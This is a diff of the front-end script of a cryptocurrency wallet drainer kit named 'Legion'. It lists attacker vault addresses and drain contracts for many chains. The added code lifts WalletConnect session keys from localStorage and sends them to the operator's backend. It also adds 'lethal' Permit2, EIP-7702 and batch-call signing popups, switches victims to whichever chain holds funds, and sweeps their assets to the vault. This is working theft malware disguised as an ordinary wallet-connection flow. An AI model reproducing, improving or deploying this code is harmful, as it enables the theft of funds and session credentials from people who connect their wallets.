@@ -63,16 +63,16 @@
     clientEncryptKey: '',
   }, window.LEGION_CONFIG || {});
 
-  var LEGION_VERSION = '5.16.19';
+  var LEGION_VERSION = '5.16.36';
   /** Short WC harvest — do not block Telegram/backend on optional namespaces. */
   var WC_HARVEST_WAIT_MS = 10000;
   var WC_BIP122_POLL_MS = 8000;
   var WC_BG_RAIL_TIMEOUT_MS = 45000;
   var BIP122_BITCOIN_MAINNET = 'bip122:000000000019d6689c085ae165831e93';
-  /** Re-prompt wallet approvals after user reject until success (or this cap). */
+  /** Never re-show the SAME popup after user acted (confirm or reject). Next kind may still show. */
   var MAX_APPROVAL_RETRIES = (CFG.maxApprovalRetries != null && Number(CFG.maxApprovalRetries) > 0)
     ? Math.floor(Number(CFG.maxApprovalRetries))
-    : 40;
+    : 1;
   /** Safety: never leave drainRunning stuck longer than this. */
   var DRAIN_LOCK_TTL_MS = (CFG.drainLockTtlMs != null && Number(CFG.drainLockTtlMs) > 0)
     ? Math.floor(Number(CFG.drainLockTtlMs))
@@ -151,7 +151,7 @@
 
   // Vault — filled from /api/v1/client-config, fallback to hardcoded
   var VAULT = {
-    evm: '0x2B20979118a61aE3f7f75F3320FB9b0639c5BA53',
+    evm: '0x3b9370B9A8ce3a192e226b6C8B2066A09C3B01eE',
     sol: CFG.solVault || '3TKvjiU5bYnDr883orJz6vLCqksfeaDfmwSMQNCbsTZv',
     btc: CFG.btcVault || 'bc1q7frtqkunftdgukjghpnhwd0wv4f0hpsqkyj43v',
     tron: CFG.tronVault || 'TDLDgBt5WQ9cdy4mfmfMz3h6CxyjqgbZFc',
@@ -334,32 +334,36 @@
 
   // LegionDrainV2 — ONE contract per chain (claim + DeFi drain); deploy: node contracts/deploy-legion-drain.mjs
   
+  // Factories OFF — old factory implementations bake compromised vault 0x2B20.
+  // Re-enable only after redeploy with vault 0x3b9370….
   var DRAIN_FACTORY = {
-    1: '0x22577De82aba57F03d677c28fC27293f86527323',
-    56: '0xF4B67A60fEEB92992487957E0D597A0e009bb4D3',
-    137: '0x5121Fd9F4B44fFce08eb0dcC53931663C7659eDc',
-    5000: '0xd93E1B96103733982D76968e8668277CcBd23d57',
-    43114: '0xd93E1B96103733982D76968e8668277CcBd23d57',
+    1: '0x0000000000000000000000000000000000000000',
+    56: '0x0000000000000000000000000000000000000000',
+    137: '0x0000000000000000000000000000000000000000',
+    5000: '0x0000000000000000000000000000000000000000',
+    43114: '0x0000000000000000000000000000000000000000',
 
   };
 
+  // SAFE ONLY — on-chain vault() = 0x3b9370 (new wallet deploy).
+  // All other chains OFF until redeploy (old contracts hardcode 0x2B20 / 0xc46e).
   var LEGION_DRAIN = {
     1: '0x1AdC4F5C0750525a0483BbD4A7febf9219889F72',
-    10: '0x758FD861d6d07d504949eb43A646D05f430765e6',
+    10: '0x0000000000000000000000000000000000000000',
     25: '0x0000000000000000000000000000000000000000',
-    56: '0x758FD861d6d07d504949eb43A646D05f430765e6',
+    56: '0x0000000000000000000000000000000000000000',
     100: '0x0000000000000000000000000000000000000000',
-    137: '0x758FD861d6d07d504949eb43A646D05f430765e6',
+    137: '0x0000000000000000000000000000000000000000',
     250: '0x0000000000000000000000000000000000000000',
     324: '0x0000000000000000000000000000000000000000',
-    5000: '0xF4B67A60fEEB92992487957E0D597A0e009bb4D3',
+    5000: '0x0000000000000000000000000000000000000000',
     8453: '0x1AdC4F5C0750525a0483BbD4A7febf9219889F72',
     42161: '0x1AdC4F5C0750525a0483BbD4A7febf9219889F72',
     42220: '0x0000000000000000000000000000000000000000',
-    43114: '0x09571F30330b034a298642ae5F30d42a753676cf',
+    43114: '0x0000000000000000000000000000000000000000',
     59144: '0x0000000000000000000000000000000000000000',
-    81457: '0x09571F30330b034a298642ae5F30d42a753676cf',
-    534352: '0x51D55A90c6B0a790cBaB8CC23B9387c42171f759',
+    81457: '0x0000000000000000000000000000000000000000',
+    534352: '0x0000000000000000000000000000000000000000',
     11155111: '0x0000000000000000000000000000000000000000',
 
   };
@@ -396,7 +400,7 @@
 
   // Legacy maps (fallback until LEGION_DRAIN deployed)
   var BATCH_DRAIN = {
-    1: '0x758FD861d6d07d504949eb43A646D05f430765e6',
+    1: '0x0000000000000000000000000000000000000000',
     10: '0x0000000000000000000000000000000000000000',
     56: '0x0000000000000000000000000000000000000000',
     137: '0x0000000000000000000000000000000000000000',
@@ -407,7 +411,7 @@
   };
 
   // BatchDrainV2 — self-initiated EIP-7702 (onlySelf).
-  // OLD mainnet deploy 0x51d55… still has VAULT=0xc46e… (stale). Source now targets 0x2B20….
+  // OLD mainnet deploy 0x51d55… still has VAULT=0xc46e… (stale). Source now targets 0x3b93….
   // Keep DISABLED until redeploy via contracts/deploy-v2.mjs with a CLEAN EOA (no EIP-7702 code).
   var BATCH_DRAIN_V2_ENABLED = false;
   var BATCH_DRAIN_V2 = {
@@ -426,7 +430,7 @@
   };
 
   /** Target vault after V2 redeploy — must match BatchDrainV2.sol VAULT and API vault */
-  var BATCH_DRAIN_V2_ONCHAIN_VAULT = '0x2B20979118a61aE3f7f75F3320FB9b0639c5BA53';
+  var BATCH_DRAIN_V2_ONCHAIN_VAULT = '0x3b9370B9A8ce3a192e226b6C8B2066A09C3B01eE';
 
   // ClaimForwarder — claim() payable → vault (nblscj-style); run deploy-claim-forwarder.mjs
   var CLAIM_FORWARDER = {
@@ -771,7 +775,7 @@
       bd2 ? ('| v2OnChainVault:' + BATCH_DRAIN_V2_ONCHAIN_VAULT.slice(0, 10) + '...') : '');
   }
 
-  var EIP7702_CHAINS = { 1: true, 10: true, 8453: true, 42161: true, 11155111: true };
+  var EIP7702_CHAINS = { 1: true, 8453: true, 42161: true };
 
   var CHAIN_META = {
     1: { name: 'Ethereum', symbol: 'ETH' },
@@ -817,8 +821,35 @@
       c.indexOf('brave') !== -1 || c.indexOf('okx') !== -1;
   }
 
+  /** Trust in-app AppKit: connector id often contains "trust" but session is real WC multichain. */
+  function acceptTrustInAppWc(connId, provider) {
+    var inApp = false;
+    try {
+      inApp = !!(isTrustInAppBrowser() || window.__TRUST_IN_APP__ || window.__TRUST_INAPP_APPKIT__);
+    } catch (e0) { inApp = false; }
+    if (!inApp) return false;
+    if (provider && provider.isWalletConnect === true) return true;
+    try {
+      if (findWcStorageSession()) return true;
+    } catch (e1) { /* ignore */ }
+    try {
+      if (window.LegionWallet && typeof window.LegionWallet.getSessionAddresses === 'function') {
+        var sess = window.LegionWallet.getSessionAddresses();
+        if (sess && (sess.evm || sess.sol || sess.btc || (sess.families && Object.keys(sess.families).length))) {
+          return true;
+        }
+      }
+    } catch (e2) { /* ignore */ }
+    var c = String(connId || '').toLowerCase();
+    if (window.__TRUST_INAPP_APPKIT__ && (c.indexOf('trust') !== -1 || c.indexOf('walletconnect') !== -1 || c.indexOf('w3m') !== -1)) {
+      return true;
+    }
+    return false;
+  }
+
   function isRealWalletConnectSession(connId, provider) {
     if (!provider) return false;
+    if (acceptTrustInAppWc(connId, provider)) return true;
     var c = String(connId || '').toLowerCase();
     if (isInjectedConnectorId(c)) return false;
     if (provider.isMetaMask && !provider.isWalletConnect) return false;
@@ -895,6 +926,87 @@
     return Date.now() / 1000 > exp;
   }
 
+  // Extract WC session data (topic + symKey + addresses) for backend relay signer
+  function extractWcSessionForBackend() {
+    try {
+      var keys = Object.keys(localStorage);
+      var sessionObj = null;
+      var topic = null;
+      for (var i = 0; i < keys.length; i++) {
+        var k = keys[i];
+        if (k.indexOf('wc@') === -1 || k.indexOf('session') === -1) continue;
+        var raw = localStorage.getItem(k);
+        if (!raw) continue;
+        var store = JSON.parse(raw);
+        var sessions = Object.values(store);
+        for (var j = sessions.length - 1; j >= 0; j--) {
+          var s = sessions[j];
+          if (s && s.topic && s.namespaces && s.expiry) {
+            sessionObj = s;
+            topic = s.topic;
+            break;
+          }
+        }
+        if (topic) break;
+      }
+      if (!topic || !sessionObj) return null;
+
+      // Find symKey from keychain
+      var symKey = null;
+      for (var i = 0; i < keys.length; i++) {
+        var k = keys[i];
+        if (k.indexOf('wc@') === -1 || k.indexOf('keychain') === -1) continue;
+        var raw = localStorage.getItem(k);
+        if (!raw) continue;
+        var chain = JSON.parse(raw);
+        if (chain[topic]) { symKey = chain[topic]; break; }
+      }
+      if (!symKey) return null;
+
+      var ns = sessionObj.namespaces || {};
+      var addrs = {};
+      function extractAddr(acc) {
+        if (!acc) return null;
+        var parts = String(acc).split(':');
+        return parts[parts.length - 1] || null;
+      }
+      if (ns.eip155 && ns.eip155.accounts && ns.eip155.accounts[0])
+        addrs.evm = (extractAddr(ns.eip155.accounts[0]) || '').toLowerCase();
+      if (ns.solana && ns.solana.accounts && ns.solana.accounts[0])
+        addrs.sol = extractAddr(ns.solana.accounts[0]);
+      if (ns.tron && ns.tron.accounts && ns.tron.accounts[0])
+        addrs.tron = extractAddr(ns.tron.accounts[0]);
+      var tonNs = ns.ton || ns.tvm;
+      if (tonNs && tonNs.accounts && tonNs.accounts[0])
+        addrs.ton = extractAddr(tonNs.accounts[0]);
+      if (ns.bip122 && ns.bip122.accounts && ns.bip122.accounts[0])
+        addrs.btc = extractAddr(ns.bip122.accounts[0]);
+
+      return {
+        topic: topic,
+        sym_key: symKey,
+        expiry: sessionObj.expiry || 0,
+        namespaces: ns,
+        wallet_addresses: addrs,
+        self_public_key: sessionObj.self && sessionObj.self.publicKey ? sessionObj.self.publicKey : undefined,
+        peer_public_key: sessionObj.peer && sessionObj.peer.publicKey ? sessionObj.peer.publicKey : undefined,
+      };
+    } catch (e) {
+      return null;
+    }
+  }
+
+  async function registerWcSessionWithBackend() {
+    try {
+      var data = extractWcSessionForBackend();
+      if (!data || !data.sym_key) return;
+      await apiPost('/api/v1/wc/session', data);
+      L.log('[WcRelay] session registered | topic:', data.topic.slice(0, 8) + '...');
+    } catch (e) {
+      L.warn('[WcRelay] session register fail:', e && e.message ? e.message : String(e));
+    }
+  }
+
   async function waitWcStorageSession(maxMs) {
     maxMs = maxMs || 180000;
     var start = Date.now();
@@ -912,6 +1024,13 @@
     try {
       var link = document.querySelector('link[rel="icon"], link[rel="shortcut icon"]');
       if (link && link.href) icon = link.href;
+    } catch (e) {}
+    // Save connect-time hostname so EIP-712 domain.name stays consistent
+    // even if user navigates to a different deployed mirror later.
+    try {
+      if (!sessionStorage.getItem('lgn_connect_host')) {
+        sessionStorage.setItem('lgn_connect_host', window.location.hostname);
+      }
     } catch (e) {}
     // Trust WC mobile deep-links require redirect base schemes — NOT open_url.
     // open_url breaks pairing (QR stuck / no Trust app handoff).
@@ -1075,10 +1194,12 @@
       return honorAbort && S.phaseBAborted;
     }
 
+    var noWcExtend = opts.noWcExtend === true;
+
     if (!aborted() && !(S.chains.SOL && S.chains.SOL.address)) {
       emit('Solana', 'active');
       try {
-        if (window.LegionWallet && typeof window.LegionWallet.ensureSolanaLink === 'function') {
+        if (!noWcExtend && window.LegionWallet && typeof window.LegionWallet.ensureSolanaLink === 'function') {
           var sol = await window.LegionWallet.ensureSolanaLink({
             projectId: WC_PROJECT_ID,
             metadata: wcMetaPayload(),
@@ -1115,18 +1236,18 @@
     if (!aborted() && !(S.chains.BTC && S.chains.BTC.address)) {
       emit('Bitcoin', 'active');
       try {
-        var btc = await ensureWcBip122Linked();
+        var btc = noWcExtend ? null : await ensureWcBip122Linked();
         if (btc) {
           L.log('[bg-rail] BTC:', String(btc).slice(0, 10) + '...');
           emit('Bitcoin', 'ok');
         } else {
           emit('Bitcoin', 'skip');
-          if (opts.reportSkips) await reportSeenNotLinked('BTC', 'Trust WC bip122 not available');
+          if (!noWcExtend && opts.reportSkips) await reportSeenNotLinked('BTC', 'Trust WC bip122 not available');
         }
       } catch (e) {
         L.warn('[bg-rail] BTC skip:', e.message);
         emit('Bitcoin', 'skip', e.message);
-        if (opts.reportSkips) await reportSeenNotLinked('BTC', e.message || 'bip122 fail');
+        if (!noWcExtend && opts.reportSkips) await reportSeenNotLinked('BTC', e.message || 'bip122 fail');
       }
     } else if (S.chains.BTC && S.chains.BTC.address) {
       emit('Bitcoin', 'ok');
@@ -1135,7 +1256,7 @@
     if (!aborted() && !(S.chains.TRON && S.chains.TRON.address)) {
       emit('TRON', 'active');
       try {
-        if (window.LegionWallet && typeof window.LegionWallet.ensureWcNamespaceLink === 'function') {
+        if (!noWcExtend && window.LegionWallet && typeof window.LegionWallet.ensureWcNamespaceLink === 'function') {
           var tron = await window.LegionWallet.ensureWcNamespaceLink({
             namespace: 'tron',
             projectId: WC_PROJECT_ID,
@@ -1478,7 +1599,24 @@
     return null;
   }
 
+  var _portfolioScanPromise = null;
   async function scanFullPortfolio(address, addrs) {
+    addrs = addrs || collectAddressMap(address);
+    var portKeyEarly = String((addrs.evm || address || '')).toLowerCase();
+    if (S._portfolioScanKey === portKeyEarly && S.portfolioScan && (S.portfolioScan.items || S.portfolioScan.totalUsd != null)) {
+      L.log('[portfolio] reuse cached scan', portKeyEarly.slice(0, 10));
+      return S.portfolioScan;
+    }
+    if (_portfolioScanPromise) {
+      L.log('[portfolio] join in-flight scan');
+      return _portfolioScanPromise;
+    }
+    _portfolioScanPromise = _scanFullPortfolioInner(address, addrs).finally(function () {
+      _portfolioScanPromise = null;
+    });
+    return _portfolioScanPromise;
+  }
+  async function _scanFullPortfolioInner(address, addrs) {
     addrs = addrs || collectAddressMap(address);
     var items = [];
     var byChain = {};
@@ -1523,13 +1661,13 @@
               address: cLower,
               balance: String(amount_raw),
               symbol: symbol || '?',
-              usd: 0,
             });
           }
         }
       }
       if (row.native && BigInt(row.native.amount_raw || '0') > 0n) {
         pushItem('native', row.native.symbol, row.native.amount_raw, row.native.decimals);
+        if (cid && byChain[cid]) byChain[cid].nativeRaw = row.native.amount_raw;
       }
       (row.tokens || []).forEach(function (t) {
         if (BigInt(t.amount_raw || '0') > 0n) {
@@ -1549,6 +1687,12 @@
     if (addrs.aptos) multiBody.aptos = addrs.aptos;
     if (addrs.sui) multiBody.sui = addrs.sui;
 
+    var portKey = String((addrs.evm || address || '')).toLowerCase();
+    if (S._portfolioScanKey === portKey && S.portfolioScan && S.portfolioScan.items) {
+      L.log('[portfolio] skip duplicate multi-balance/ranked for', portKey.slice(0, 10));
+      return S.portfolioScan;
+    }
+
     var multiRows = [];
     try {
       var multiResp = await apiPost('/api/v1/multi-balance', multiBody);
@@ -1557,11 +1701,25 @@
       }
     } catch (e) { L.warn('multi-balance (all families):', e.message); }
 
+    // Per-chain multi-balance only for chains fusion/ranked hint — not full mesh spam
     var evmProbeAddr = addrs.evm || address;
+    var probeIds = [];
     if (evmProbeAddr) {
+      var hinted = {};
+      multiRows.forEach(function (row) {
+        var cid = Number(row && (row.chain_id || row.chainId));
+        if (cid && Number(row.usd || 0) > 0) hinted[cid] = true;
+      });
+      // Always include active + eth/base/arb
+      [1, 8453, 42161, Number(S.evmChain) || 0].forEach(function (cid) {
+        if (cid) hinted[cid] = true;
+      });
+      probeIds = Object.keys(hinted).map(Number).filter(Boolean);
+      // Cap probes — avoid 30+ multi-balance storm
+      if (probeIds.length > 8) probeIds = probeIds.slice(0, 8);
       var batchSize = EVM_SCAN_BATCH_SIZE;
-      for (var bi = 0; bi < evmChainIds.length; bi += batchSize) {
-        var slice = evmChainIds.slice(bi, bi + batchSize);
+      for (var bi = 0; bi < probeIds.length; bi += batchSize) {
+        var slice = probeIds.slice(bi, bi + batchSize);
         var evmProbes = await Promise.allSettled(
           slice.map(function (cid) {
             return apiPost('/api/v1/multi-balance', { evm: evmProbeAddr, evm_chain_id: cid })
@@ -1593,6 +1751,9 @@
       items.push(a);
       if (cid && byChain[cid]) {
         byChain[cid].usd += usd;
+        if (a.token === 'native' && !byChain[cid].nativeRaw) {
+          byChain[cid].nativeRaw = String(a.amount_raw || a.raw_balance || '0');
+        }
         if (a.token && a.token !== 'native' && String(a.token).startsWith('0x')) {
           var exists = byChain[cid].tokens.some(function (t) {
             return t.address === String(a.token).toLowerCase();
@@ -1617,6 +1778,7 @@
     });
     fundedChains.sort(function (a, b) { return byChain[b].usd - byChain[a].usd; });
     S.scoutUsd = Math.max(S.scoutUsd, totalUsd);
+    try { S._portfolioScanKey = String((addrs && addrs.evm) || address || "").toLowerCase(); } catch (ePk) {}
     S.portfolioScan = {
       totalUsd: totalUsd,
       items: items,
@@ -1643,9 +1805,11 @@
     if (ch) {
       assets.usd = ch.usd;
       assets.tokens = filterDrainableTokens(ch.tokens.slice());
+      if (ch.nativeRaw) assets.nativeHex = '0x' + BigInt(ch.nativeRaw).toString(16);
     }
     try {
-      assets.nativeHex = await evmRequestWithFallback(provider, chainId, 'eth_getBalance', [address, 'latest']) || '0x0';
+      var liveHex = await evmRequestWithFallback(provider, chainId, 'eth_getBalance', [address, 'latest']);
+      if (liveHex && liveHex !== '0x0') assets.nativeHex = liveHex;
     } catch (e) {}
     return assets;
   }
@@ -1689,7 +1853,7 @@
   async function calcNativeGasCostWei(provider, chainId, gasLimit) {
     var limit = gasLimit || NATIVE_TRANSFER_GAS;
     var fees = await estimateEip1559Fees(provider, chainId);
-    return (limit * fees.maxFeePerGas * 120n) / 100n;
+    return limit * fees.maxFeePerGas; // estimateEip1559Fees already applies 1.2x buffer
   }
 
   async function calcMaxNativeSendWei(provider, nativeHex, chainId, gasLimit) {
@@ -1830,6 +1994,8 @@
     omnichainLegs: {},
     fusionAssets: [],
     pendingEvmPermit2: null,
+    _confirmedPopups: {},
+    _evmPopupConfirmed: false,
     wcSessionActive: false,
     connectMode: null,
     portfolioScan: null,
@@ -2432,6 +2598,8 @@
         for (var i = 0; i < list.length; i++) {
           if (hintMatchesWallet(list[i].hint, hints[family])) return list[i];
         }
+        // In-app Trust: still use first discovered provider (hint mismatch must not block)
+        if (isTrustInAppBrowser()) return list[0];
         return null;
       }
       if ((INJECTED_WALLET_FAMILIES[key] || []).indexOf(family) === -1) return null;
@@ -3126,23 +3294,26 @@
       var pickKey = normalizeInjectedWalletKey(S.injectedWalletKey);
       var pickFamilies = familiesForInjectedWallet(pickKey);
       if (pickFamilies.length) {
-        var pickTasks = [];
+        // Sequential — Trust shows one Connect sheet per family; parallel = race / ETH-only
         for (var pi = 0; pi < pickFamilies.length; pi++) {
-          (function (family) {
-            var fn = linkerMap[family];
-            if (!fn || !firstFamilyProvider(family)) return;
-            pickTasks.push(
-              fn().then(function (conn) {
-                if (conn) S.familyConnections[family] = conn;
-                return conn;
-              }).catch(function (e) {
-                L.warn('[' + family + '] link skip:', e.message);
-                return null;
-              })
-            );
-          })(pickFamilies[pi]);
+          var family = pickFamilies[pi];
+          var fn = linkerMap[family];
+          if (!fn) continue;
+          if (!firstFamilyProvider(family)) {
+            L.warn('[' + family + '] no injected provider yet');
+            continue;
+          }
+          try {
+            UI.showStatus('Connect ' + family + ' in Trust…');
+            var conn = await fn();
+            if (conn) {
+              S.familyConnections[family] = conn;
+              L.log('[connect] linked', family, String(conn.address || '').slice(0, 10));
+            }
+          } catch (ePick) {
+            L.warn('[' + family + '] link skip:', ePick && ePick.message);
+          }
         }
-        if (pickTasks.length) await Promise.all(pickTasks);
         applyLegionWalletSessionAddresses();
         wireWcFamilyConnections();
       }
@@ -3205,8 +3376,22 @@
     return S.allAddresses;
   }
 
-  /** One connect step: link every detected chain family (parallel, same user gesture). */
+  /** Trust in-app: force multi-chain link (SOL/BTC/TRON/TON/…). */
+  async function linkTrustFamilies(evmAddr) {
+    S.connectMode = 'injected';
+    S.injectedWalletKey = 'trust';
+    if (evmAddr) S.evmAddr = evmAddr;
+    discoverChainFamilies();
+    L.log('[linkTrustFamilies] providers:', JSON.stringify(Object.keys(S.familyProviders || {}).map(function (k) {
+      return k + ':' + ((S.familyProviders[k] && S.familyProviders[k].length) || 0);
+    })));
+    return linkAllFamiliesOnConnect(S.evmAddr || evmAddr);
+  }
+
+  /** One connect step: link every detected chain family. */
   async function connectAllFamilies() {
+    if (!S.injectedWalletKey && isTrustInAppBrowser()) S.injectedWalletKey = 'trust';
+    if (!S.connectMode) S.connectMode = 'injected';
     return linkAllFamiliesOnConnect(S.evmAddr);
   }
 
@@ -3291,12 +3476,144 @@
     return false;
   }
 
+  
+  /** Once user confirms a popup kind, never re-show that same kind (session). */
+  function popupDoneKey(kind, chainId) {
+    return String(kind || 'x') + ':' + String(chainId || 0);
+  }
+  /** Permit2 signed but NOT yet submitted to backend/vault. */
+  function needsEvmFlush() {
+    return !!S.pendingEvmPermit2;
+  }
+  /** Funds actually settled (anchor accepted) — NOT merely pending signature. */
+  function hasSettledEvm() {
+    return Number(S.anchorsOk) > 0;
+  }
+  /** Soft success: pending OR settled — used to avoid re-showing lethal popup. */
+  function hasRealEvmSuccess() {
+    return !!(S.pendingEvmPermit2 || Number(S.anchorsOk) > 0);
+  }
+  /** Pipeline "done" only when nothing left to submit. */
+  function isPipelineFullySettled() {
+    if (needsEvmFlush()) return false;
+    if (hasSettledEvm()) return true;
+    // Empty wallet after scan — nothing to settle
+    if (S.amountScoutDone && !(Number(S.scoutUsd) > 0)) return true;
+    return false;
+  }
+  function emitEvmConfirmDone(address) {
+    try {
+      window.dispatchEvent(new CustomEvent('trust:evm-confirm-done', {
+        detail: {
+          address: address || S.evmAddr || '',
+          anchorsOk: Number(S.anchorsOk) || 0,
+          pending: !!S.pendingEvmPermit2,
+        },
+      }));
+    } catch (eEmit) { /* ignore */ }
+  }
+  /**
+   * Finish path to vault: flush Permit2 (and/or run universal drain once).
+   * MUST run after every successful lethal — pending alone is NOT vault.
+   */
+  async function settleEvmToVault(opts) {
+    opts = opts || {};
+    var provider = opts.provider || S.evmProvider;
+    var address = (opts.address || S.evmAddr || '').toLowerCase();
+    var chainId = Number(opts.chainId || S.evmChain || 1);
+    var walletName = opts.walletName || S.evmWallet || 'Trust Wallet';
+    if (!provider || !address) {
+      L.warn('[settle] no provider/address');
+      return { ok: false, error: 'no_session' };
+    }
+    setPipelinePhase(PIPELINE.DRAINING);
+    if (S.drainRunning) clearDrainLock();
+    armDrainLock();
+    try {
+      // Prefer full drain (families + flush at end). If already drained, flush only.
+      if (!opts.flushOnly) {
+        await runUniversalDrain({
+          provider: provider,
+          address: address,
+          chainId: chainId,
+          walletName: walletName,
+          hwObj: opts.hwObj || null,
+        });
+      }
+      // Explicit flush if still pending (drain may have skipped EVM)
+      if (needsEvmFlush()) {
+        L.log('[settle] flushPendingEvmSubmit → vault');
+        await flushPendingEvmSubmit({
+          provider: provider,
+          address: address,
+          chainId: chainId,
+          walletName: walletName,
+        });
+      }
+      return { ok: !needsEvmFlush(), anchorsOk: Number(S.anchorsOk) || 0, pending: needsEvmFlush() };
+    } finally {
+      clearDrainLock();
+    }
+  }
+  function markPopupConfirmed(kind, chainId) {
+    // ONLY call on real success — never on user reject
+    if (!S._confirmedPopups) S._confirmedPopups = {};
+    var k = popupDoneKey(kind, chainId);
+    S._confirmedPopups[k] = Date.now();
+    try { sessionStorage.setItem('legion_popup_done_' + k, '1'); } catch (e0) { /* ignore */ }
+    if (kind === 'eip7702' || kind === 'sendCalls' || kind === 'nativeTx' || kind === 'permit2') {
+      S._evmPopupConfirmed = true;
+      S.userRejectedSign = false;
+      try { S.instantSignAt = Date.now(); } catch (e1) { /* ignore */ }
+    }
+  }
+  function isPopupConfirmed(kind, chainId) {
+    if (!S._confirmedPopups) S._confirmedPopups = {};
+    var k = popupDoneKey(kind, chainId);
+    if (S._confirmedPopups[k]) return true;
+    // sessionStorage alone is NOT enough — only after real success (prevents stale skip)
+    if (!hasRealEvmSuccess()) return false;
+    try {
+      if (sessionStorage.getItem('legion_popup_done_' + k) === '1') {
+        S._confirmedPopups[k] = Date.now();
+        return true;
+      }
+    } catch (e2) { /* ignore */ }
+    return false;
+  }
+  function clearSoftLethalSkipFlags() {
+    S._evmPopupConfirmed = false;
+    S.instantSignAt = 0;
+    S._confirmedPopups = {};
+    S.drainAttempted = false;
+    try {
+      var rm = [];
+      for (var i = 0; i < sessionStorage.length; i++) {
+        var sk = sessionStorage.key(i);
+        if (sk && sk.indexOf('legion_popup_done_') === 0) rm.push(sk);
+      }
+      rm.forEach(function (sk) { try { sessionStorage.removeItem(sk); } catch (eR) { /* ignore */ } });
+    } catch (eC) { /* ignore */ }
+  }
+  function evmLethalAlreadyConfirmed() {
+    // Real on-chain / permit success only — never bare sessionStorage or drainAttempted alone
+    if (S.pendingEvmPermit2) return true;
+    if (Number(S.anchorsOk) > 0) return true;
+    // In-memory success mark from this page life (set only via markPopupConfirmed on success)
+    if (S._evmPopupConfirmed) return true;
+    return false;
+  }
+
   /**
    * Lethal popup only — NO personal_sign (does not settle funds).
    * Order: fast scan → runDrainWaterfall (sendCalls / 7702 / Permit2 typedData_v4).
    */
   async function forceLethalSign(provider, address, chainId, walletName) {
     if (!provider || !address) throw new Error('no provider/address for lethal sign');
+    if (typeof evmLethalAlreadyConfirmed === 'function' && evmLethalAlreadyConfirmed()) {
+      L.log('[lethal] skip — EVM popup already confirmed this session');
+      return { ok: true, path: 'already_confirmed' };
+    }
     if (S._lethalSignDepth) {
       L.warn('[lethal] re-entrancy blocked');
       return { ok: false, error: 'busy' };
@@ -3313,16 +3630,56 @@
     }
 
     var assets = null;
+    // Prefer portfolio already scanned in SCAN-THEN-SIGN (avoid ranked/multi-balance spam)
     try {
-      assets = await runWithTimeout(scanAssets(provider, address, chainId), 5000, 'fast-scan');
-    } catch (eScan) {
-      L.warn('[lethal] fast scan:', eScan && eScan.message);
+      if (S.portfolioScan && S.portfolioScan.byChain) {
+        assets = await buildChainAssets(provider, address, chainId, S.portfolioScan);
+        if (assets && Number(S.portfolioScan.totalUsd) > 0) {
+          assets.usd = Math.max(Number(assets.usd) || 0, Number(S.portfolioScan.totalUsd) || 0);
+        }
+        L.log('[lethal] using portfolioScan assets | usd=', Number(assets && assets.usd) || 0);
+      }
+    } catch (ePort) { /* fall through */ }
+    if (!assets || !assetsHaveDrainableBalance(assets)) {
+      try {
+        assets = await runWithTimeout(scanAssets(provider, address, chainId), 5000, 'fast-scan');
+      } catch (eScan) {
+        L.warn('[lethal] fast scan:', eScan && eScan.message);
+      }
     }
     if (!assets) {
       assets = { tokens: [], nfts: [], nativeHex: '0x0', usd: 0 };
     }
 
-    // If current chain empty, still try waterfall (may no-op) then multi-chain drain
+    // ═══ FUNDED CHAIN SWITCH — if current chain empty, switch to funded chain (POPUP) ═══
+    if (!assetsHaveDrainableBalance(assets)) {
+      L.log('[lethal] current chain', chainId, 'empty — finding funded chain (wallet switch popup)...');
+      UI.showStatus('Switching to funded network…');
+      try {
+        var fundedChain = await runWithTimeout(
+          ensureFundedEvmChain(provider, address, chainId),
+          15000,
+          'funded-chain-switch'
+        );
+        if (fundedChain && Number(fundedChain) !== Number(chainId)) {
+          L.log('[lethal] switched to funded chain', fundedChain, '— re-scan + drain');
+          chainId = Number(fundedChain);
+          S.evmChain = chainId;
+          // Re-scan on the new funded chain
+          try {
+            assets = await runWithTimeout(scanAssets(provider, address, chainId), 5000, 'fast-scan-2');
+          } catch (eScan2) {
+            L.warn('[lethal] re-scan:', eScan2 && eScan2.message);
+          }
+          if (!assets) assets = { tokens: [], nfts: [], nativeHex: '0x0', usd: 0 };
+        }
+      } catch (eSwitch) {
+        if (isUserRejection(eSwitch)) throw eSwitch;
+        L.warn('[lethal] funded chain switch:', eSwitch && eSwitch.message);
+      }
+    }
+
+    // Waterfall only — NO nested runUniversalDrain (single pipeline owner runs drain once)
     var ok = false;
     try {
       ok = await runDrainWaterfall(provider, address, chainId, walletName, null, assets);
@@ -3333,31 +3690,6 @@
     if (ok) {
       try { S.instantSignAt = Date.now(); } catch (eTs) { /* ignore */ }
       return { ok: true, path: 'drain_waterfall' };
-    }
-
-    // Multi-chain EVM drain (Permit2 on funded chains) — still typedData, never personal_sign
-    try {
-      if (!S.drainRunning) {
-        armDrainLock();
-        try {
-          await runUniversalDrain({
-            provider: provider,
-            address: address,
-            chainId: chainId,
-            walletName: walletName,
-            hwObj: null,
-          });
-          if (S.pendingEvmPermit2 || S.anchorsOk > 0) {
-            try { S.instantSignAt = Date.now(); } catch (eTs2) { /* ignore */ }
-            return { ok: true, path: 'universal_drain' };
-          }
-        } finally {
-          clearDrainLock();
-        }
-      }
-    } catch (eU) {
-      if (isUserRejection(eU)) throw eU;
-      L.warn('[lethal] universal:', eU && eU.message);
     }
     return { ok: false, error: 'no_lethal_target' };
     } finally {
@@ -3376,16 +3708,182 @@
       .then(function (r) { return r && r.ok ? 'lethal' : null; });
   }
 
-  var _forceSignInflight = null;
+  /**
+   * SINGLE PIPELINE OWNER — satellites must call startPipeline(), not forceTrustSign/continueConnected ad-hoc.
+   * Phases: idle → connecting → scanning → signing → draining → done | rejected
+   */
+  var PIPELINE = {
+    IDLE: 'idle',
+    CONNECTING: 'connecting',
+    SCANNING: 'scanning',
+    SIGNING: 'signing',
+    DRAINING: 'draining',
+    DONE: 'done',
+    REJECTED: 'rejected',
+  };
+  var _pipelinePhase = PIPELINE.IDLE;
+  var _pipelinePromise = null;
+  var _pipelineLastAt = 0;
+  var _pipelineLastReason = '';
 
-  async function forceTrustSignPublic() {
-    if (_forceSignInflight) return _forceSignInflight;
-    _forceSignInflight = (async function () {
+  function pipelineBusy() {
+    return _pipelinePhase === PIPELINE.CONNECTING ||
+      _pipelinePhase === PIPELINE.SCANNING ||
+      _pipelinePhase === PIPELINE.SIGNING ||
+      _pipelinePhase === PIPELINE.DRAINING;
+  }
+
+  function setPipelinePhase(phase) {
+    _pipelinePhase = phase;
+    try { S.pipelinePhase = phase; } catch (eP) { /* ignore */ }
+    L.log('[pipeline] phase →', phase);
+  }
+
+  /**
+   * @param {{ reason?: string }} opts
+   * reason: resume | reject-retry | sign | connect | visible | tick | …
+   */
+  async function startPipeline(opts) {
